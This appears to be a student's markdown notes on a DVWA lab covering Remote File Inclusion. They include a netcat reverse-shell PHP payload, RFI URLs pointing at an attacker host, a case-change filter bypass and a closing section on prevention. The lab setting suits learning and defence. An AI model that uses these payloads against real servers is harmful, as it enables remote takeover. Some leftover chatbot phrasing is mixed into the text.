

 Remote File Inclusion (RFI) 

 What is RFI?

 Remote File Inclusion (RFI) is an advanced form of file inclusion vulnerability.
 Unlike Local File Inclusion (LFI) (which accesses files on the same server), RFI allows us to include files from an external server.
 This means we can inject and execute malicious PHP files hosted on another machine.

---

 Why RFI is Dangerous

If exploited, an attacker can:

 Execute remote code
 Run system commands
 Get a reverse shell
 Gain full control over the server

---

 Requirement for RFI

RFI only works if certain PHP settings are enabled on the target server:

 `allow_url_fopen = On`
 `allow_url_include = On`

These settings allow PHP to load files from external URLs.

---

 Where to Find These Settings

On the target machine (e.g., Metasploitable), open the PHP configuration file:

```bash
sudo nano /etc/php5/cgi/php.ini
```

Search for:

```ini
allow_url_fopen = On
allow_url_include = On
```

If both are enabled → RFI is possible

---

 Apply Changes

After checking or modifying the settings, restart the web server:

```bash
sudo service apache2 restart
```

---

 How RFI Works

 The application uses a parameter like:

  ```
  ?page=somefile.php
  ```
 Instead of a local file, attacker provides a remote URL:

  ```
  ?page=http://attacker.com/shell.php
  ```
 The server loads and executes the remote PHP file

---

 Key Difference (LFI vs RFI)

| Type | Access                |
| ---- | --------------------- |
| LFI  | Local server files    |
| RFI  | Remote external files |

---

 Key Takeaway

 LFI → Read files
 RFI → Execute remote code (more dangerous)

Here’s your content rewritten into simple, clean notes with image placeholders so you can directly use it in your GitHub `.md` file:

---

 Remote File Inclusion (RFI) Exploitation – DVWA Lab

---

 1. Goal

* In Damn Vulnerable Web Application (DVWA), we already used LFI to access local files like `/etc/passwd`.
* Now, we try to include a file from another server (Remote File Inclusion).

---

 2. Setup (Attacker + Target)

* Attacker machine (Kali Linux) → Hosts the malicious file
* Target machine (Metasploitable) → Vulnerable web server

Both machines must be on the same network so they can communicate.

---

 3. Create Malicious File (Payload)

On Kali Linux, create a simple PHP file:

```php
<?php passthru("nc -e /bin/sh <KALI-IP> 5555"); ?>
```

* `passthru()` → Executes system commands
* Payload → Opens a reverse shell using Netcat

---

 4. Important Trick (Save as .txt)

* Save the file as:

  ```
  reverse.txt
  ```
* Store it in:

  ```
  /var/www/html/
  ```

 Why `.txt` instead of `.php`?

* If saved as `.php` → executes on Kali (attacker machine) 
* If saved as `.txt` → executed on target via RFI 

---

 5. Verify File Access

Open browser on Kali:

```id="q1"
http://<KALI-IP>/reverse.txt
```

* You should see the PHP code displayed

---

<img width="1418" height="359" alt="Screenshot 2026-05-06 at 8 30 18 PM" src="https://github.com/user-attachments/assets/8d7a2113-9676-469e-b3f2-ece5cbe21748" />


---

 6. Start Listener (Attacker)

On Kali, start Netcat:

```bash
nc -lnvp 5555
```

---

<img width="1364" height="301" alt="Screenshot 2026-05-06 at 8 40 03 PM" src="https://github.com/user-attachments/assets/600efed3-1e71-40e6-b03f-54147efc395b" />

<img width="1440" height="160" alt="Screenshot 2026-05-06 at 8 40 12 PM" src="https://github.com/user-attachments/assets/77e56e48-bd20-445d-a954-9b1e9dc40127" />


---

 7. Exploit RFI

In DVWA URL, instead of local file, include remote file:

```id="q2"
http://<TARGET-IP>/dvwa/vulnerabilities/fi/?page=http://<KALI-IP>/reverse.txt
```

(Optional: add `?` at the end if needed)

---

<img width="1244" height="319" alt="Screenshot 2026-05-06 at 8 43 54 PM" src="https://github.com/user-attachments/assets/4bc4356e-4981-4dfd-9c30-43b23cfabcc9" />


---

 8. Result (Reverse Shell)

* The target server loads the remote file
* Executes the PHP payload
* Sends a reverse shell to Kali

On Netcat:

```bash
uname -a
```

* Confirms access to Metasploitable machine



---

 9. Post Exploitation

Now you can run commands like:

```bash
whoami
pwd
ls
```

* You have full control over the target system

---

  Key Points

* RFI allows remote file execution
* Requires:

  * `allow_url_include = On`
  * `allow_url_fopen = On`
* Use `.txt` to avoid execution on attacker machine
* Always start listener before triggering payload


Here you go — everything kept the same, just updated the port to 5555:

---

 Remote File Inclusion (RFI) – Medium Security (DVWA)

---

 1. Change Security Level

Go to DVWA Security Settings
Set security level to Medium

---

 2. Try Previous Exploit

Use the same payload as before:

```
?page=http://<KALI-IP>/reverse.txt
```

Start listener on Kali:

```
nc -lnvp 5555
```

---

 3. Result

Exploit fails
No reverse shell
Error message is displayed

<img width="1440" height="899" alt="Screenshot 2026-05-06 at 8 51 59 PM" src="https://github.com/user-attachments/assets/b47c062c-95ee-4ef5-a628-cb46995e55fa" />


---

 4. Why It Failed

DVWA Medium level uses basic filtering
It blocks:

* http
* https

 So your payload gets removed before execution

---

 5. Bypass the Filter

Since filtering is case-sensitive, we can bypass it by changing case:

```
?page=hTTp://<KALI-IP>/reverse.txt
```

Notice:

* `hTTp` instead of `http`

---

 6. Result After Bypass

Payload executed
Reverse shell received
Full access to target system

<img width="1433" height="882" alt="Screenshot 2026-05-06 at 8 52 43 PM" src="https://github.com/user-attachments/assets/5653c8ea-2e3b-4c5f-a6c6-08d0c74157d9" />


---

 7. Why This Works

The filter only removes lowercase:

```
http / https
```

* It does NOT detect:

```
hTTp / HttP
```

 So attacker bypasses security easily

---

 8. Key Takeaways

* Medium security uses weak filtering
* Filters are:

  * Case-sensitive ❌
  * Easy to bypass ❌
* Never rely only on filters for security

---

  Important Concept

Filtering is not a secure defense
Attackers can always bypass filters using small tricks like:

* Case changes
* Encoding
* Alternative inputs

---
Here’s your content rewritten into simple, clean notes (with structure + easy to revise + image placeholders):

---

 File Inclusion Vulnerabilities – Prevention (DVWA)

---

 1. Types of File Inclusion

We studied two types in Damn Vulnerable Web Application (DVWA):

 🔹 Local File Inclusion (LFI)

* Allows reading local files on the server
* Example:

  ```
  /etc/passwd
  ```
* Leads to information disclosure

---

 Remote File Inclusion (RFI) { Security Fixing }

* Allows including files from external servers
* Can execute malicious PHP code
* Leads to:

  * Reverse shell
  * Remote command execution
  * Full system compromise

---

 2. Prevention of RFI

 Disable Dangerous PHP Settings

Open PHP configuration file:

```bash
sudo nano /etc/php5/cgi/php.ini
```

Search for:

```ini
allow_url_fopen = Off
allow_url_include = Off
```

* `allow_url_fopen` → disables remote file access
* `allow_url_include` → prevents remote file execution

Save and restart Apache:

```bash
sudo systemctl restart apache2
```

---



 3. Avoid Dynamic File Inclusion (Main Fix)

 Vulnerable Code (Dynamic Inclusion)

```php
include($_GET['page']);
```

* Takes user input directly
* User can manipulate it:

  ```
  ?page=../../etc/passwd
  ?page=http://attacker.com/shell.php
  ```
* Leads to LFI + RFI


---

 4. Secure Method (Hardcoded Inclusion)

  Safe Approach

```php
include("page.php");
```

OR use whitelist:

```php
if ($page == "home") {
    include("home.php");
} elseif ($page == "about") {
    include("about.php");
} else {
    echo "Invalid page";
}
```

* Only allowed files are included
* User cannot manipulate input


---

 5. DVWA Security Comparison

 🔴 Low / Medium Security

* Uses dynamic inclusion:

  ```php
  include($_GET['page']);
  ```
* Any input is accepted
* Easily exploitable


---

 🟢 High Security

* Uses hardcoded / controlled inclusion
* Only specific files allowed
* Example logic:

  * Check if file is in allowed list
  * Otherwise → show error


---

 6. Key Takeaways

* Never trust user input in file inclusion
* Disable:

  * `allow_url_fopen`
  * `allow_url_include`
* Avoid dynamic inclusion (`$_GET`, `$_POST`)
* Use:

  * Hardcoded paths
  * Whitelisting

---

 Important Concept

> Dynamic file inclusion = Dangerous
> Hardcoded / whitelist inclusion = Secure

Even if filters are applied:

* Attackers can bypass them
* Best defense is proper design, not filtering





